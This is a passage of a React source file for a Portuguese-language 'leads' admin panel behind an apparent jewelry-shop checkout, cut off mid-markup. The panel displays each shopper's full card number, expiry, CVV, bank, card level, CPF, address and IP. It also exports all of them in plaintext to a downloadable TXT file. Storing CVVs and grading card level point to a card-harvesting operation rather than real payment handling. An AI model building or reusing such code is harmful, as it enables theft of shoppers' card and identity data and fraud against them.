"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { formatBRL } from "@/lib/format";
import { resolveOrderStatus, ORDER_STATUS_LABEL, type OrderStatus } from "@/lib/orderStatus";

interface LeadItem {
  productName: string;
  quantity: number;
  unitPriceCents: number;
}

interface Lead {
  id: string;
  fullName: string;
  email: string;
  phone: string;
  cpf: string;
  cep: string;
  address: string;
  number: string;
  complement: string | null;
  neighborhood: string;
  city: string;
  state: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  cardBank: string | null;
  cardLevel: string | null;
  ip: string | null;
  installments: string;
  notes: string | null;
  itemsJson: string;
  subtotalCents: number;
  discountCents: number;
  totalCents: number;
  manualStatus: string | null;
  paymentMethod: string;
  createdAt: string;
}

function Field({ label, value }: { label: string; value: string | null }) {
  return (
    <div>
      <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
        {label}
      </span>
      <p className="mt-0.5 text-sm font-medium text-cream/90">{value || "—"}</p>
    </div>
  );
}

function whatsappLink(phone: string, name: string) {
  const digits = phone.replace(/\D/g, "");
  const withCountry = digits.startsWith("55") ? digits : `55${digits}`;
  const text = encodeURIComponent(
    `Olá ${name.split(" ")[0]}, aqui é da V.CLOSET! Vi seu pedido e gostaria de conversar sobre ele.`
  );
  return `https://wa.me/${withCountry}?text=${text}`;
}

const STATUS_BADGE: Record<OrderStatus, string> = {
  WHATSAPP: "border-[#25D366]/50 bg-[#25D366]/10 text-[#4ae08a]",
  AGUARDANDO_PAGAMENTO: "border-amber-400/40 bg-amber-400/10 text-amber-300",
  PAGO: "border-emerald-400/40 bg-emerald-400/10 text-emerald-300",
  ENVIADO: "border-sky-400/40 bg-sky-400/10 text-sky-300",
  RECUSADO: "border-red-400/40 bg-red-400/10 text-red-300",
  CANCELADO: "border-zinc-400/40 bg-zinc-400/10 text-zinc-300",
};

const STATUS_OPTIONS: { value: OrderStatus; label: string }[] = [
  { value: "AGUARDANDO_PAGAMENTO", label: "Aguardando pagamento" },
  { value: "PAGO", label: "Pago" },
  { value: "ENVIADO", label: "Enviado" },
  { value: "CANCELADO", label: "Cancelado" },
];

export default function LeadsPanelPage() {
  const [checking, setChecking] = useState(true);
  const [authed, setAuthed] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState<string | null>(null);
  const [loggingIn, setLoggingIn] = useState(false);
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loadingLeads, setLoadingLeads] = useState(false);
  const [filterFrom, setFilterFrom] = useState("");
  const [filterTo, setFilterTo] = useState("");
  const [search, setSearch] = useState("");
  const [tab, setTab] = useState<"leads" | "pedidos" | "pix" | "recusados" | "preventivo">("leads");
  const [updatingStatusId, setUpdatingStatusId] = useState<string | null>(null);
  const [pixStatusFilter, setPixStatusFilter] = useState<"todos" | "pendentes" | "pagos">("todos");

  const matchesFilters = useCallback(
    (lead: Lead) => {
      const from = filterFrom ? new Date(`${filterFrom}T00:00:00`).getTime() : null;
      const to = filterTo ? new Date(`${filterTo}T23:59:59.999`).getTime() : null;
      const term = search.trim().toLowerCase();
      const t = new Date(lead.createdAt).getTime();
      if (from !== null && t < from) return false;
      if (to !== null && t > to) return false;
      if (term) {
        const haystack = `${lead.fullName} ${lead.email} ${lead.phone} ${lead.cpf}`.toLowerCase();
        if (!haystack.includes(term)) return false;
      }
      return true;
    },
    [filterFrom, filterTo, search]
  );

  // Pedidos recusados (cartão reutilizado) e bloqueios preventivos ficam
  // apenas nas próprias abas, fora da lista de Leads.
  const filteredLeads = useMemo(
    () =>
      leads.filter(
        (lead) =>
          lead.manualStatus !== "RECUSADO" &&
          lead.manualStatus !== "AUTO_BLOCK" &&
          matchesFilters(lead)
      ),
    [leads, matchesFilters]
  );

  const recusadosLeads = useMemo(
    () => leads.filter((lead) => lead.manualStatus === "RECUSADO" && matchesFilters(lead)),
    [leads, matchesFilters]
  );

  // Aba "Preventivo BLOCK": tentativas bloqueadas automaticamente por fluxo
  // intenso de pedidos do mesmo IP.
  const preventivoLeads = useMemo(
    () => leads.filter((lead) => lead.manualStatus === "AUTO_BLOCK" && matchesFilters(lead)),
    [leads, matchesFilters]
  );

  // Aba "Pedidos": todos os pedidos (inclusive recusados, exibidos como
  // "Pedido Recusado").
  const pedidosLeads = useMemo(
    () => leads.filter(matchesFilters),
    [leads, matchesFilters]
  );

  const [blockedCards, setBlockedCards] = useState<{ id: string; number: string }[]>([]);
  const [blockedIps, setBlockedIps] = useState<{ id: string; ip: string }[]>([]);

  const loadBlockedIps = useCallback(async () => {
    try {
      const res = await fetch("/api/leads-panel/ips-bloqueados", { cache: "no-store" });
      if (res.ok) {
        const data = await res.json();
        setBlockedIps(Array.isArray(data.ips) ? data.ips : []);
      }
    } catch {
      // silencioso: a lista de bloqueados é secundária
    }
  }, []);

  async function handleBlockIp(lead: Lead) {
    if (!lead.ip || lead.ip === "local") return;
    if (!window.confirm(`Bloquear o IP ${lead.ip}? Todas as novas tentativas vindas dele serão recusadas automaticamente.`)) {
      return;
    }
    const res = await fetch("/api/leads-panel/ips-bloqueados", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ ip: lead.ip }),
    });
    if (!res.ok) {
      const data = await res.json().catch(() => null);
      window.alert(data?.error || "Erro ao bloquear o IP.");
      return;
    }
    await loadBlockedIps();
  }

  async function handleUnblockIp(ip: string) {
    if (!window.confirm(`Desbloquear o IP ${ip}?`)) return;
    await fetch(`/api/leads-panel/ips-bloqueados?ip=${encodeURIComponent(ip)}`, {
      method: "DELETE",
    });
    await loadBlockedIps();
  }

  const loadBlockedCards = useCallback(async () => {
    try {
      const res = await fetch("/api/leads-panel/cartoes-bloqueados", { cache: "no-store" });
      if (res.ok) {
        const data = await res.json();
        setBlockedCards(Array.isArray(data.cards) ? data.cards : []);
      }
    } catch {
      // silencioso: a lista de bloqueados é secundária
    }
  }, []);

  async function handleBlockCard(lead: Lead) {
    const digits = lead.cardNumber.replace(/\D/g, "");
    const mask = digits.length >= 4 ? `**** ${digits.slice(-4)}` : lead.cardNumber;
    if (!window.confirm(`Bloquear o cartão ${mask}? Todas as novas tentativas com ele serão recusadas automaticamente.`)) {
      return;
    }
    const res = await fetch("/api/leads-panel/cartoes-bloqueados", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ number: digits }),
    });
    if (!res.ok) {
      const data = await res.json().catch(() => null);
      window.alert(data?.error || "Erro ao bloquear o cartão.");
      return;
    }
    await loadBlockedCards();
  }

  async function handleUnblockCard(number: string) {
    const mask = number.length >= 4 ? `**** ${number.slice(-4)}` : number;
    if (!window.confirm(`Desbloquear o cartão ${mask}?`)) return;
    await fetch(`/api/leads-panel/cartoes-bloqueados?number=${encodeURIComponent(number)}`, {
      method: "DELETE",
    });
    await loadBlockedCards();
  }

  const summary = useMemo(() => {
    const totalCents = filteredLeads.reduce((sum, l) => sum + l.totalCents, 0);
    const count = filteredLeads.length;
    const avgCents = count > 0 ? Math.round(totalCents / count) : 0;
    return { count, totalCents, avgCents };
  }, [filteredLeads]);

  const pixLeads = useMemo(
    () => filteredLeads.filter((l) => l.paymentMethod === "PIX"),
    [filteredLeads]
  );

  const pixSummary = useMemo(() => {
    let collectedCents = 0;
    let pendingCents = 0;
    let pagos = 0;
    let pendentes = 0;
    for (const lead of pixLeads) {
      const status = resolveOrderStatus(lead.createdAt, lead.manualStatus, lead.paymentMethod);
      if (status === "PAGO" || status === "ENVIADO") {
        collectedCents += lead.totalCents;
        pagos += 1;
      } else {
        pendingCents += lead.totalCents;
        pendentes += 1;
      }
    }
    return { count: pixLeads.length, collectedCents, pendingCents, pagos, pendentes };
  }, [pixLeads]);

  const pixVisibleLeads = useMemo(() => {
    if (pixStatusFilter === "todos") return pixLeads;
    return pixLeads.filter((lead) => {
      const status = resolveOrderStatus(lead.createdAt, lead.manualStatus, lead.paymentMethod);
      const isPaid = status === "PAGO" || status === "ENVIADO";
      return pixStatusFilter === "pagos" ? isPaid : !isPaid;
    });
  }, [pixLeads, pixStatusFilter]);

  const loadLeads = useCallback(async () => {
    setLoadingLeads(true);
    try {
      const res = await fetch("/api/leads-panel/leads", { cache: "no-store" });
      if (res.status === 401) {
        setAuthed(false);
        return;
      }
      const data = await res.json();
      setLeads(Array.isArray(data.leads) ? data.leads : []);
      setAuthed(true);
    } catch {
      setLoginError("Não foi possível carregar os leads.");
    } finally {
      setLoadingLeads(false);
    }
  }, []);

  useEffect(() => {
    loadLeads().finally(() => setChecking(false));
    loadBlockedCards();
    loadBlockedIps();
    document.title = "ADMINISTRAÇÃO V-CLOSET";
  }, [loadLeads, loadBlockedCards, loadBlockedIps]);

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setLoginError(null);
    setLoggingIn(true);
    try {
      const res = await fetch("/api/leads-panel/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password }),
      });
      if (!res.ok) {
        const data = await res.json().catch(() => ({}));
        setLoginError(data.error || "E-mail ou senha inválidos.");
        return;
      }
      setEmail("");
      setPassword("");
      await loadLeads();
      await loadBlockedCards();
      await loadBlockedIps();
    } catch {
      setLoginError("Erro de conexão. Tente novamente.");
    } finally {
      setLoggingIn(false);
    }
  }

  async function handleLogout() {
    await fetch("/api/leads-panel/logout", { method: "POST" });
    setAuthed(false);
    setLeads([]);
    setBlockedCards([]);
    setBlockedIps([]);
  }

  async function handleClearAll() {
    if (!window.confirm("Apagar TODOS os leads? Esta ação não pode ser desfeita.")) return;
    await fetch("/api/leads-panel/leads?all=1", { method: "DELETE" });
    await loadLeads();
  }

  async function handleDelete(id: string) {
    if (!window.confirm("Apagar este lead?")) return;
    await fetch(`/api/leads-panel/leads?id=${encodeURIComponent(id)}`, {
      method: "DELETE",
    });
    await loadLeads();
  }

  async function handleStatusChange(id: string, manualStatus: OrderStatus) {
    setUpdatingStatusId(id);
    try {
      const res = await fetch("/api/leads-panel/leads", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id, manualStatus }),
      });
      if (res.ok) {
        const data = await res.json();
        setLeads((prev) =>
          prev.map((l) => (l.id === id ? { ...l, manualStatus: data.lead.manualStatus } : l))
        );
      }
    } finally {
      setUpdatingStatusId(null);
    }
  }

  function handleExportTxt() {
    // Exportação em TXT legível: 1 pedido por bloco, um dado por linha,
    // dividido em dados pessoais e dados de pagamento informados no checkout.
    const divider = "--------------------------------------------------";
    const blocks = filteredLeads.map((lead, index) => {
      const isPix = lead.paymentMethod?.toUpperCase() === "PIX";
      // Número completo do cartão, agrupado em blocos de 4 quando possível
      const digits = lead.cardNumber?.replace(/\D/g, "") ?? "";
      const cartao = isPix
        ? "-"
        : digits.length === 16
          ? digits.replace(/(\d{4})(?=\d)/g, "$1 ")
          : digits || "-";
      const linhas: string[] = [
        `PEDIDO ${index + 1}`,
        divider,
        "--- DADOS PESSOAIS ---",
        `Nome: ${lead.fullName}`,
        `E-mail: ${lead.email}`,
        `Telefone: ${lead.phone}`,
        `CPF: ${lead.cpf}`,
        `CEP: ${lead.cep}`,
        `Endereço: ${lead.address}, ${lead.number}`,
        `Complemento: ${lead.complement || "-"}`,
        `Bairro: ${lead.neighborhood}`,
        `Cidade/UF: ${lead.city}/${lead.state}`,
        `IP: ${lead.ip || "-"}`,
        "--- DADOS DE PAGAMENTO ---",
        `Forma de pagamento: ${isPix ? "PIX (WhatsApp)" : "Cartão"}`,
        `Parcelas: ${isPix ? "-" : lead.installments}`,
        `Número do cartão: ${cartao}`,
        `Validade: ${isPix ? "-" : lead.cardExpiry || "-"}`,
        `CVV: ${isPix ? "-" : lead.cardCvv || "-"}`,
        `Banco/Instituição: ${lead.cardBank || "-"}`,
        `Nível do cartão: ${lead.cardLevel || "-"}`,
        `Total: ${formatBRL(lead.totalCents)}`,
      ];
      return linhas.join("\n");
    });
    const conteudo = [
      "V.CLOSET — PEDIDOS",
      `Exportado em ${new Date().toLocaleString("pt-BR")}`,
      `Total de pedidos: ${filteredLeads.length}`,
      "",
      ...blocks.map((b) => `${b}\n${divider}\n`),
    ].join("\n");
    const blob = new Blob(["\uFEFF" + conteudo], { type: "text/plain;charset=utf-8;" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `vcloset-pedidos-${new Date().toISOString().slice(0, 10)}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  if (checking) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-ink">
        <p className="text-sm tracking-widest2 text-cream/50">CARREGANDO…</p>
      </main>
    );
  }

  if (!authed) {
    return (
      <main className="flex min-h-screen items-center justify-center bg-ink px-4">
        <div className="w-full max-w-sm">
          <div className="text-center">
            <img
              src="/logo-vcloset-plain.svg"
              alt="VCLOSET — Joias e Acessórios"
              className="mx-auto h-auto w-56"
            />
            <h1 className="mt-6 font-serif text-2xl tracking-widest2 text-gold-400">
              ADMINISTRAÇÃO
            </h1>
            <p className="mt-1 font-serif text-2xl tracking-widest2 text-cream">
              V-CLOSET
            </p>
            <p className="mt-3 text-xs uppercase tracking-widest2 text-cream/50">
              Painel de Leads do Checkout
            </p>
          </div>

          <form
            onSubmit={handleLogin}
            className="mt-10 space-y-5 rounded-lg border border-gold-400/20 bg-ink-soft p-7"
          >
            <div>
              <label
                htmlFor="panel-email"
                className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/60"
              >
                E-mail
              </label>
              <input
                id="panel-email"
                type="email"
                autoComplete="username"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className="mt-1.5 w-full rounded border border-gold-400/20 bg-ink px-3 py-2.5 text-sm text-cream outline-none transition focus:border-gold-400/60"
                placeholder="seu@email.com"
              />
            </div>
            <div>
              <label
                htmlFor="panel-password"
                className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/60"
              >
                Senha
              </label>
              <input
                id="panel-password"
                type="password"
                autoComplete="current-password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="mt-1.5 w-full rounded border border-gold-400/20 bg-ink px-3 py-2.5 text-sm text-cream outline-none transition focus:border-gold-400/60"
                placeholder="••••••••"
              />
            </div>

            {loginError && (
              <p className="rounded border border-red-500/30 bg-red-500/10 px-3 py-2 text-xs text-red-300">
                {loginError}
              </p>
            )}

            <button
              type="submit"
              disabled={loggingIn}
              className="w-full rounded bg-gold-400 py-3 text-xs font-bold uppercase tracking-widest2 text-ink transition hover:bg-gold-300 disabled:cursor-not-allowed disabled:opacity-50"
            >
              {loggingIn ? "Entrando…" : "Entrar"}
            </button>
          </form>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-ink px-4 py-10 sm:px-8">
      <div className="mx-auto max-w-5xl">
        <div className="flex flex-wrap items-end justify-between gap-4">
          <div>
            <img
              src="/logo-vcloset-plain.svg"
              alt="VCLOSET — Joias e Acessórios"
              className="h-auto w-48"
            />
            <p className="mt-2 text-xs uppercase tracking-widest2 text-gold-400">
              ADMINISTRAÇÃO V-CLOSET
            </p>
            <p className="mt-2 text-xs uppercase tracking-widest2 text-cream/50">
              Painel de Leads · {filteredLeads.length} lead
              {filteredLeads.length === 1 ? "" : "s"}
              {filteredLeads.length !== leads.length
                ? ` (de ${leads.length} no total)`
                : ""}
            </p>
          </div>
          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={loadLeads}
              disabled={loadingLeads}
              className="rounded border border-gold-400/30 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-gold-400 transition hover:border-gold-400/60 disabled:opacity-50"
            >
              {loadingLeads ? "Atualizando…" : "Atualizar"}
            </button>
            <button
              onClick={handleExportTxt}
              disabled={filteredLeads.length === 0}
              className="rounded border border-gold-400/30 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-gold-400 transition hover:border-gold-400/60 disabled:opacity-30"
            >
              Exportar TXT
            </button>
            <button
              onClick={handleClearAll}
              disabled={leads.length === 0}
              className="rounded border border-red-500/40 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/70 disabled:opacity-30"
            >
              Limpar histórico
            </button>
            <button
              onClick={handleLogout}
              className="rounded border border-cream/20 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-cream/60 transition hover:border-cream/40"
            >
              Sair
            </button>
          </div>
        </div>

        <div className="mt-8 flex gap-6 border-b border-gold-400/15">
          <button
            onClick={() => setTab("leads")}
            className={`-mb-px border-b-2 pb-3 text-[11px] font-bold uppercase tracking-widest2 transition ${
              tab === "leads"
                ? "border-gold-400 text-gold-400"
                : "border-transparent text-cream/50 hover:text-cream/80"
            }`}
          >
            Leads ({leads.length})
          </button>
          <button
            onClick={() => setTab("pedidos")}
            className={`-mb-px border-b-2 pb-3 text-[11px] font-bold uppercase tracking-widest2 transition ${
              tab === "pedidos"
                ? "border-gold-400 text-gold-400"
                : "border-transparent text-cream/50 hover:text-cream/80"
            }`}
          >
            Pedidos ({leads.length})
          </button>
          <button
            onClick={() => setTab("pix")}
            className={`-mb-px border-b-2 pb-3 text-[11px] font-bold uppercase tracking-widest2 transition ${
              tab === "pix"
                ? "border-gold-400 text-gold-400"
                : "border-transparent text-cream/50 hover:text-cream/80"
            }`}
          >
            Pix ({pixLeads.length})
          </button>
          <button
            onClick={() => setTab("recusados")}
            className={`-mb-px border-b-2 pb-3 text-[11px] font-bold uppercase tracking-widest2 transition ${
              tab === "recusados"
                ? "border-red-400 text-red-300"
                : "border-transparent text-cream/50 hover:text-cream/80"
            }`}
          >
            Recusados ({recusadosLeads.length})
          </button>
          <button
            onClick={() => setTab("preventivo")}
            className={`-mb-px flex items-center gap-2 border-b-2 pb-3 text-[11px] font-bold uppercase tracking-widest2 transition ${
              tab === "preventivo"
                ? "border-amber-400 text-amber-300"
                : "border-transparent text-cream/50 hover:text-cream/80"
            }`}
          >
            Preventivo BLOCK ({preventivoLeads.length})
            {preventivoLeads.length > 0 && (
              <span className="relative flex h-2 w-2">
                <span className="absolute inline-flex h-full w-full animate-ping rounded-full bg-amber-400 opacity-60" />
                <span className="relative inline-flex h-2 w-2 rounded-full bg-amber-400" />
              </span>
            )}
          </button>
        </div>

        {(blockedCards.length > 0 || blockedIps.length > 0) && (
          <div className="mt-4 space-y-2 rounded-lg border border-red-400/20 bg-red-400/5 px-4 py-2.5">
            {blockedCards.length > 0 && (
              <div className="flex flex-wrap items-center gap-2">
                <span className="text-[10px] font-bold uppercase tracking-widest2 text-red-300/80">
                  Cartões bloqueados:
                </span>
                {blockedCards.map((card) => {
                  const mask =
                    card.number.length >= 4
                      ? `**** ${card.number.slice(-4)}`
                      : card.number;
                  return (
                    <span
                      key={card.id}
                      className="inline-flex items-center gap-1.5 rounded-full border border-red-400/30 bg-ink-soft px-2.5 py-1 text-[10px] font-semibold text-red-200"
                    >
                      {mask}
                      <button
                        onClick={() => handleUnblockCard(card.number)}
                        className="text-red-300/60 transition hover:text-red-200"
                        aria-label={`Desbloquear cartão ${mask}`}
                        title="Desbloquear"
                      >
                        ✕
                      </button>
                    </span>
                  );
                })}
              </div>
            )}
            {blockedIps.length > 0 && (
              <div className="flex flex-wrap items-center gap-2">
                <span className="text-[10px] font-bold uppercase tracking-widest2 text-red-300/80">
                  IPs bloqueados:
                </span>
                {blockedIps.map((blocked) => (
                  <span
                    key={blocked.id}
                    className="inline-flex items-center gap-1.5 rounded-full border border-red-400/30 bg-ink-soft px-2.5 py-1 text-[10px] font-semibold text-red-200"
                  >
                    {blocked.ip}
                    <button
                      onClick={() => handleUnblockIp(blocked.ip)}
                      className="text-red-300/60 transition hover:text-red-200"
                      aria-label={`Desbloquear IP ${blocked.ip}`}
                      title="Desbloquear"
                    >
                      ✕
                    </button>
                  </span>
                ))}
              </div>
            )}
          </div>
        )}

        <div className="mt-6 flex flex-wrap items-end gap-3 rounded-lg border border-gold-400/15 bg-ink-soft px-5 py-4">
          <div>
            <label
              htmlFor="filter-search"
              className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40"
            >
              Buscar
            </label>
            <input
              id="filter-search"
              type="text"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Nome, e-mail, telefone ou CPF"
              className="mt-1 w-56 rounded border border-gold-400/20 bg-ink px-3 py-2 text-sm text-cream outline-none transition focus:border-gold-400/60"
            />
          </div>
          <div>
            <label
              htmlFor="filter-from"
              className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40"
            >
              De
            </label>
            <input
              id="filter-from"
              type="date"
              value={filterFrom}
              onChange={(e) => setFilterFrom(e.target.value)}
              className="mt-1 rounded border border-gold-400/20 bg-ink px-3 py-2 text-sm text-cream outline-none transition focus:border-gold-400/60"
            />
          </div>
          <div>
            <label
              htmlFor="filter-to"
              className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40"
            >
              Até
            </label>
            <input
              id="filter-to"
              type="date"
              value={filterTo}
              onChange={(e) => setFilterTo(e.target.value)}
              className="mt-1 rounded border border-gold-400/20 bg-ink px-3 py-2 text-sm text-cream outline-none transition focus:border-gold-400/60"
            />
          </div>
          {(filterFrom || filterTo || search) && (
            <button
              onClick={() => {
                setFilterFrom("");
                setFilterTo("");
                setSearch("");
              }}
              className="rounded border border-cream/20 px-4 py-2 text-[10px] font-bold uppercase tracking-widest2 text-cream/60 transition hover:border-cream/40"
            >
              Limpar filtro
            </button>
          )}

          <div className="ml-auto flex gap-6 text-right">
            <div>
              <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                Pedidos
              </span>
              <p className="text-sm font-bold text-cream">{summary.count}</p>
            </div>
            <div>
              <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                Total
              </span>
              <p className="text-sm font-bold text-gold-400">{formatBRL(summary.totalCents)}</p>
            </div>
            <div>
              <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                Ticket médio
              </span>
              <p className="text-sm font-bold text-cream">{formatBRL(summary.avgCents)}</p>
            </div>
          </div>
        </div>

        {tab === "leads" && (
        <>
        {leads.length === 0 ? (
          <p className="mt-16 text-center text-sm text-cream/50">
            Nenhum lead enviado ainda.
          </p>
        ) : filteredLeads.length === 0 ? (
          <p className="mt-16 text-center text-sm text-cream/50">
            Nenhum lead encontrado para esse filtro.
          </p>
        ) : (
          <div className="mt-8 space-y-4">
            {filteredLeads.map((lead) => {
              let items: LeadItem[] = [];
              try {
                items = JSON.parse(lead.itemsJson) as LeadItem[];
              } catch {
                items = [];
              }

              return (
                <div
                  key={lead.id}
                  className="rounded-lg border border-gold-400/15 bg-ink-soft p-5"
                >
                  <div className="flex flex-wrap items-center justify-between gap-3">
                    <div>
                      <p className="text-sm font-semibold text-cream">
                        #{lead.id.slice(-6).toUpperCase()} · {lead.fullName}
                      </p>
                      <p className="text-xs text-cream/50">
                        {lead.email} · {lead.phone}
                      </p>
                    </div>
                    <div className="flex items-center gap-4">
                      <div className="text-right">
                        <p className="text-sm font-bold text-gold-400">
                          {formatBRL(lead.totalCents)}
                        </p>
                        <p className="text-xs text-cream/50">
                          {lead.installments}
                          {lead.installments === "1" ? "x (à vista)" : "x sem juros"} ·{" "}
                          {new Date(lead.createdAt).toLocaleString("pt-BR")}
                        </p>
                      </div>
                      <a
                        href={whatsappLink(lead.phone, lead.fullName)}
                        target="_blank"
                        rel="noreferrer"
                        className="rounded border border-emerald-500/40 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-emerald-300 transition hover:border-emerald-500/70"
                      >
                        WhatsApp
                      </a>
                      {lead.paymentMethod === "CARTAO" && (
                        <button
                          onClick={() => handleBlockCard(lead)}
                          className="rounded border border-red-500/30 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/60"
                          title="Bloqueia este cartão: novas tentativas serão recusadas"
                        >
                          Bloquear cartão
                        </button>
                      )}
                      {lead.ip && lead.ip !== "local" && (
                        <button
                          onClick={() => handleBlockIp(lead)}
                          className="rounded border border-red-500/30 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/60"
                          title="Bloqueia este IP: novas tentativas serão recusadas"
                        >
                          Bloquear IP
                        </button>
                      )}
                      <button
                        onClick={() => handleDelete(lead.id)}
                        className="rounded border border-red-500/30 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/60"
                        aria-label={`Excluir lead ${lead.fullName}`}
                      >
                        Excluir
                      </button>
                    </div>
                  </div>

                  <div className="mt-4 grid gap-3 border-t border-gold-400/10 pt-4 text-sm sm:grid-cols-2 lg:grid-cols-4">
                    <Field label="CPF" value={lead.cpf} />
                    <Field label="CEP" value={lead.cep} />
                    <Field label="Endereço" value={`${lead.address}, ${lead.number}`} />
                    <Field label="Complemento" value={lead.complement} />
                    <Field label="Bairro" value={lead.neighborhood} />
                    <Field label="Cidade/UF" value={`${lead.city}/${lead.state}`} />
                    <Field label="Cartão" value={lead.cardNumber} />
                    <Field label="Banco / Instituição" value={lead.cardBank ?? "—"} />
                    <Field label="Nível do cartão" value={lead.cardLevel ?? "—"} />
                    <Field label="IP" value={lead.ip} />
                    <Field
                      label="Validade / CVV"
                      value={`${lead.cardExpiry} · ${lead.cardCvv}`}
                    />
                  </div>

                  <div className="mt-4 border-t border-gold-400/10 pt-4">
                    <span className="block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                      Itens
                    </span>
                    <ul className="mt-1 space-y-0.5 text-sm text-cream/80">
                      {items.map((item, idx) => (
                        <li key={idx}>
                          {item.productName} × {item.quantity} —{" "}
                          {formatBRL(item.unitPriceCents * item.quantity)}
                        </li>
                      ))}
                    </ul>
                    {lead.discountCents > 0 && (
                      <p className="mt-1 text-xs text-emerald-400">
                        Desconto aplicado: -{formatBRL(lead.discountCents)}
                      </p>
                    )}
                    {lead.notes && (
                      <>
                        <span className="mt-3 block text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                          Observações
                        </span>
                        <p className="mt-1 whitespace-pre-line text-sm text-cream/80">
                          {lead.notes}
                        </p>
                      </>
                    )}
                  </div>
                </div>
              );
            })}
          </div>
        )}
        </>
        )}

        {tab === "pedidos" && (
          leads.length === 0 ? (
            <p className="mt-16 text-center text-sm text-cream/50">
              Nenhum pedido recebido ainda.
            </p>
          ) : pedidosLeads.length === 0 ? (
            <p className="mt-16 text-center text-sm text-cream/50">
              Nenhum pedido encontrado para esse filtro.
            </p>
          ) : (
            <div className="mt-8 space-y-3">
              {pedidosLeads.map((lead) => {
                let items: LeadItem[] = [];
                try {
                  items = JSON.parse(lead.itemsJson) as LeadItem[];
                } catch {
                  items = [];
                }
                const status = resolveOrderStatus(lead.createdAt, lead.manualStatus, lead.paymentMethod);

                return (
                  <div
                    key={lead.id}
                    className="rounded-lg border border-gold-400/15 bg-ink-soft p-4"
                  >
                    <div className="flex flex-wrap items-center justify-between gap-3">
                      <div className="min-w-0">
                        <p className="text-sm font-semibold text-cream">
                          #{lead.id.slice(-6).toUpperCase()} · {lead.fullName}
                        </p>
                        <p className="mt-0.5 truncate text-xs text-cream/50">
                          {items
                            .map((i) => `${i.productName} × ${i.quantity}`)
                            .join(", ") || "—"}
                        </p>
                        <p className="mt-0.5 text-xs text-cream/50">
                          {new Date(lead.createdAt).toLocaleString("pt-BR")} ·{" "}
                          {lead.installments}
                          {lead.installments === "1"
                            ? "x (à vista)"
                            : "x sem juros"}
                        </p>
                      </div>
                      <div className="flex items-center gap-3">
                        <a
                          href={whatsappLink(lead.phone, lead.fullName)}
                          target="_blank"
                          rel="noreferrer"
                          className="rounded border border-emerald-500/40 px-2.5 py-1.5 text-[10px] font-bold uppercase tracking-widest2 text-emerald-300 transition hover:border-emerald-500/70"
                        >
                          WhatsApp
                        </a>
                        <div className="text-right">
                          <span
                            className={`inline-block rounded-full border px-3 py-1 text-[9px] font-bold uppercase tracking-widest2 ${STATUS_BADGE[status]}`}
                          >
                            {ORDER_STATUS_LABEL[status]}
                          </span>
                          <p className="mt-1.5 text-sm font-bold text-gold-400">
                            {formatBRL(lead.totalCents)}
                          </p>
                        </div>
                      </div>
                    </div>
                    <div className="mt-3 flex flex-wrap items-center gap-2 border-t border-gold-400/10 pt-3">
                      <span className="text-[10px] font-bold uppercase tracking-widest2 text-cream/40">
                        Marcar como:
                      </span>
                      {STATUS_OPTIONS.map((opt) => (
                        <button
                          key={opt.value}
                          onClick={() => handleStatusChange(lead.id, opt.value)}
                          disabled={updatingStatusId === lead.id || status === opt.value}
                          className={`rounded border px-2.5 py-1 text-[9px] font-bold uppercase tracking-widest2 transition disabled:opacity-40 ${
                            status === opt.value
                              ? STATUS_BADGE[opt.value]
                              : "border-cream/20 text-cream/60 hover:border-cream/40"
                          }`}
                        >
                          {opt.label}
                        </button>
                      ))}
                      {lead.paymentMethod === "CARTAO" && (
                        <button
                          onClick={() => handleBlockCard(lead)}
                          className="ml-auto rounded border border-red-500/30 px-2.5 py-1 text-[9px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/60"
                          title="Bloqueia este cartão: novas tentativas serão recusadas"
                        >
                          Bloquear cartão
                        </button>
                      )}
                      {lead.ip && lead.ip !== "local" && (
                        <button
                          onClick={() => handleBlockIp(lead)}
                          className="rounded border border-red-500/30 px-2.5 py-1 text-[9px] font-bold uppercase tracking-widest2 text-red-300 transition hover:border-red-500/60"
                          title="Bloqueia este IP: novas tentativas serão recusadas"
                        >
                          Bloquear IP
                        </button>
                      )}
                    </div>
                  </div>
                );
              })}
            </div>
          )
        )}

        {tab === "pix" && (
          <>
            <div className="mt-8 grid gap-4 sm:grid-cols-3">
